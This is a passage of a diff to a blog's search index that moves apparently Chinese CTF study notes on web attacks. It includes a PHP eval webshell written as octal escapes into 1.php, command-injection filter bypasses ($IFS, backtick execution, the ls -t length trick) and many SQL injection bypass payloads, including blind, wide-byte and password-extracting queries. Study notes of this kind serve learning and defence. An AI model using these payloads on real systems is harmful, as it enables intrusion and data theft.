&#x2F;flag</span><br><span class="line">#i也可以通过这种方式写马</span><br><span class="line">内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
-<h2 id="奇淫妓巧"><a class="header-anchor" href="#奇淫妓巧">¶</a>奇淫妓巧</h2>
-<h3 id="内联执行执行"><a class="header-anchor" href="#内联执行执行">¶</a>内联执行执行</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS$9&#96;ls&#96;</span><br><span class="line">cat$IFS$9$(ls)</span><br><span class="line">这两个命令也意思就是执行当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<p><strong>(内联，就是将``或$()内命令的输出作为输入执行)</strong></p>
-<hr>
-<h3 id="利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过"><a class="header-anchor" href="#利用ls-t和-以及换行符绕过长度限制执行命令-文件构造绕过">¶</a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t</span><br><span class="line">&#39;ca\&#39;  &#39;t \&#39;  &#39;fl\&#39;   ag   flag</span><br><span class="line">root@kali:~&#x2F;桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~&#x2F;桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\ 是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
-<p><strong>参考博客</strong>  <a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p>
-<p>​                 <a href="https://www.cnblogs.com/micr067/p/12590152.html">https://www.cnblogs.com/micr067/p/12590152.html</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_45552960/article/details/104576189">https://blog.csdn.net/qq_45552960/article/details/104576189</a></p>
-<p>​                 <a href="https://blog.csdn.net/qq_42812036/article/details/104297163">https://blog.csdn.net/qq_42812036/article/details/104297163</a></p>
-<p>​                 <a href="https://www.freesion.com/article/9046720644/">https://www.freesion.com/article/9046720644/</a></p>
 ]]></content>
       <categories>
         <category>web技术学习</category>
@@ -1299,6 +1299,132 @@ regex也有以上六种用法</p>
       <categories>
         <category>编程学习</category>
         <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入常见注释及绕过</title>
+    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
+<a id="more"></a>
+<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
+<p>1.两个空格代替一个空格（双写）</p>
+<p>2.<code>%a0</code>=空格</p>
+<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
+<p>4.括号绕过空格</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：time based盲注：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
+<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
+<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
+<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
+<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
+<p>例如：</p>
+<p>使用from to：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>使用join：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+<p>使用like：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>使用offset来绕过limit中的&quot;，&quot;：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
+<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+<p>使用between and：</p>
+<p>between a and b：返回a，b之间的数据，不包含b。</p>
+<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
+<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
+<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
+<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
+<p>1.使用注释符绕过：</p>
+<p>常用注释符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+<p>2.使用大小写绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
+<p>3.内联注释绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
+<p>5.使用URLencode，ascii编码，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
+<p>6.函数或特殊符号</p>
+<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
+<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
+<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
+<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
+<p>例如：substring()和substr()无法使用时：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
+<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
+<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>3.mysql_real_escape_string()：转义下列字符：</p>
+<p>\x00 \n \r \ ’ &quot; \x1a</p>
+<p>（防御，将mysql设置为gbk即可）</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入之mysql学习基础(一)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
+    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
+<a id="more"></a>
+<h1>MySQL的数据库结构</h1>
+<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
+<h1>注入的产生</h1>
+<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
+<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
+<h1>MySQL5注入的一般流程</h1>
+<p>获取字段数-查库名-查表名-查列名-查数据</p>
+<p>获取字段数：order by 临界值<br>
+获取库名：database()<br>
+表名和列名没有内置函数 怎么查？</p>
+<p>union语句：将不同表的两个列查询的数据去重拼接<br>
+union all ：不去重</p>
+<p>获取MySQL版本：version()<br>
+MySQL5.0以下版本只能和access数据库一样猜解<br>
+而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
+information_schema.tables 记录表名信息<br>
+information_schema.columns 记录列名信息<br>
+TABLE_SCHEMA 数据库字段<br>
+table_name 表名<br>
+column_name 列名<br>
+查表名：<br>
+SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
+查列名：<br>
+SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
+查数据：<br>
+select 列名 from 库名.表名</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -1810,43 +1936,6 @@ regex也有以上六种用法</p>
       </categories>
   </entry>
   <entry>
-    <title>sql注入之mysql学习基础(一)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
-    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
-<a id="more"></a>
-<h1>MySQL的数据库结构</h1>
-<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1>注入的产生</h1>
-<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1>MySQL5注入的一般流程</h1>
-<p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>
-获取库名：database()<br>
-表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>
-union all ：不去重</p>
-<p>获取MySQL版本：version()<br>
-MySQL5.0以下版本只能和access数据库一样猜解<br>
-而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
-information_schema.tables 记录表名信息<br>
-information_schema.columns 记录列名信息<br>
-TABLE_SCHEMA 数据库字段<br>
-table_name 表名<br>
-column_name 列名<br>
-查表名：<br>
-SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
-查列名：<br>
-SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
-查数据：<br>
-select 列名 from 库名.表名</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
     <title>sql注入之mysql学习基础(二)</title>
     <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
     <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
@@ -1953,95 +2042,6 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
-    <title>sql注入常见注释及绕过</title>
-    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
-<a id="more"></a>
-<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
-<p>1.两个空格代替一个空格（双写）</p>
-<p>2.<code>%a0</code>=空格</p>
-<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
-<p>4.括号绕过空格</p>
-<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
-<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
-<p>例如：time based盲注：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
-<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
-<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
-<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
-<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
-<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
-<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
-<p>例如：</p>
-<p>使用from to：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-<p>使用join：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
-<p>使用like：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>使用offset来绕过limit中的&quot;，&quot;：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
-<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
-<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
-<p>使用between and：</p>
-<p>between a and b：返回a，b之间的数据，不包含b。</p>
-<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
-<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
-<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
-<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
-<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
-<p>1.使用注释符绕过：</p>
-<p>常用注释符：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
-<p>用法：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
-<p>2.使用大小写绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
-<p>3.内联注释绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
-<p>5.使用URLencode，ascii编码，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
-<p>6.函数或特殊符号</p>
-<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
-<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
-<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
-<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
-<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
-<p>例如：substring()和substr()无法使用时：</p>
